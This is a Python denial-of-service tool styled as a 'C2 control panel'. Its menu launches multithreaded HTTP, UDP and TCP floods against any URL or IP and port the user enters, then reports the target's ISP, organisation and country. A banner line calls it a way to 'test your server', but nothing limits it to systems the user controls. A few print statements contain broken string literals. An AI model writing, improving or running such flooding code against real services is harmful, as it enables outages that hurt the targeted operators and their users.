import requests
import socket
import threading
import random
import time
import datetime
import platform
import os
from colorama import Fore, Style, init
import itertools

init(autoreset=True)

# تنظيف التيرمنال
os.system("cls" if platform.system() == "Windows" else "clear")

# Banner
print(Fore.CYAN + r"""
╔════════════════════════════════════════════════════╗
║           TEAM LFARA3INA – C2 CONTROL PANEL        ║
╠════════════════════════════════════════════════════╣
║ Author  : Padre & LineX                            ║
║ Version : Reborn V2.0                              ║
║ Use     : Test your server/network infrastructure  ║
╚════════════════════════════════════════════════════╝
""")

def bay_animation():
    frames = [
        Fore.RED + r"""
        ██████╗  █████╗ ██╗   ██╗
        ██╔══██╗██╔══██╗██║   ██║
        ██████╔╝███████║██║   ██║
        ██╔═══╝ ██╔══██║╚██╗ ██╔╝
        ██║     ██║  ██║ ╚████╔╝ 
        ╚═╝     ╚═╝  ╚═╝  ╚═══╝  
        """,
        Fore.YELLOW + r"""
        ██████╗  █████╗ ██╗   ██╗
        ██╔══██╗██╔══██╗██║   ██║
        ██████╔╝███████║██║   ██║
        ██╔═══╝ ██╔══██║╚██╗ ██╔╝
        ██║     ██║  ██║ ╚████╔╝ 
        ╚═╝     ╚═╝  ╚═╝  ╚═══╝  
        """,
        Fore.CYAN + r"""
        ██████╗  █████╗ ██╗   ██╗
        ██╔══██╗██╔══██╗██║   ██║
        ██████╔╝███████║██║   ██║
        ██╔═══╝ ██╔══██║╚██╗ ██╔╝
        ██║     ██║  ██║ ╚████╔╝ 
        ╚═╝     ╚═╝  ╚═╝  ╚═══╝  
        """
    ]
    for frame in itertools.cycle(frames):
        os.system("cls" if platform.system() == "Windows" else "clear")
        print(frame)
        time.sleep(0.3)

# Menu
def menu():
    print(Fore.YELLOW + """
╔═══════════════════════╗
║       MAIN MENU       ║
╠═══════════════════════╣
║ [1] HTTP Flood        ║
║ [2] UDP Flood         ║
║ [3] TCP Flood         ║
║ [0] Exit              ║
╚═══════════════════════╝
""")

def show_attack_info(ip, port, seconds, method):
    now = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
    try:
        ipinfo = requests.get(f"http://ip-api.com/json/{ip}").json()
        isp = ipinfo.get("isp", "Unknown")
        org = ipinfo.get("org", "Unknown")
        country = ipinfo.get("countryCode", "--")
    except:
        isp = org = country = "Unavailable"

    print(Fore.CYAN + "
╔" + "═" * 50 + "╗")
    print(Fore.CYAN + "║" + Fore.BLUE + "       Attack Successfully Sent              " + Fore.CYAN + "║")
    print(Fore.CYAN + "╚" + "═" * 50 + "╝
")
    print(Fore.YELLOW + f"  HOST    : [{ip}]")
    print(Fore.YELLOW + f"  PORT    : [{port}]")
    print(Fore.YELLOW + f"  TIME    : [{seconds} Seconds]")
    print(Fore.YELLOW + f"  METHOD  : [{method}]")
    print(Fore.YELLOW + f"  DATE    : [{now}]
")
    print(Fore.CYAN + "╔" + "═" * 50 + "╗")
    print(Fore.CYAN + "║" + Fore.BLUE + "                URL/IP INFO                  " + Fore.CYAN + "║")
    print(Fore.CYAN + "╚" + "═" * 50 + "╝
")
    print(Fore.GREEN + f"  ISP     : [{isp}]")
    print(Fore.GREEN + f"  ORG     : [{org}]")
    print(Fore.GREEN + f"  COUNTRY : [{country}]
")

menu()
option = input(Fore.CYAN + "[?] Select Option: ").strip()

animation_thread = threading.Thread(target=bay_animation, daemon=True)
animation_thread.start()

if option == "1":
    url = input("[+] Target URL (with http/https): ").strip()
    threads = int(input("[+] Threads: "))
    times = int(input("[+] Requests per thread: "))
    duration = int(input("[+] Duration (seconds): "))

    def http_attack():
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                for _ in range(times):
                    requests.get(url)
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=http_attack).start()

    show_attack_info(url, 80, duration, ".http-flood")

elif option == "2":
    ip = input("[+] Target IP: ").strip()
    port = int(input("[+] Port: "))
    threads = int(input("[+] Threads: "))
    times = int(input("[+] Packets per thread: "))
    duration = int(input("[+] Duration (seconds): "))

    def udp_attack():
        data = random._urandom(1024)
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(times):
                    s.sendto(data, (ip, port))
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=udp_attack).start()

    show_attack_info(ip, port, duration, ".udp-flood")

elif option == "3":
    ip = input("[+] Target IP: ").strip()
    port = int(input("[+] Port: "))
    threads = int(input("[+] Threads: "))
    times = int(input("[+] Packets per thread: "))
    duration = int(input("[+] Duration (seconds): "))

    def tcp_attack():
        data = random._urandom(1024)
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                for _ in range(times):
                    s.send(data)
                s.close()
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=tcp_attack).start()

    show_attack_info(ip, port, duration, ".tcp-flood")

elif option == "0":
    print(Fore.RED + "[-] Exiting Panel...")

else:
    print(Fore.RED + "[!] Invalid Option.")
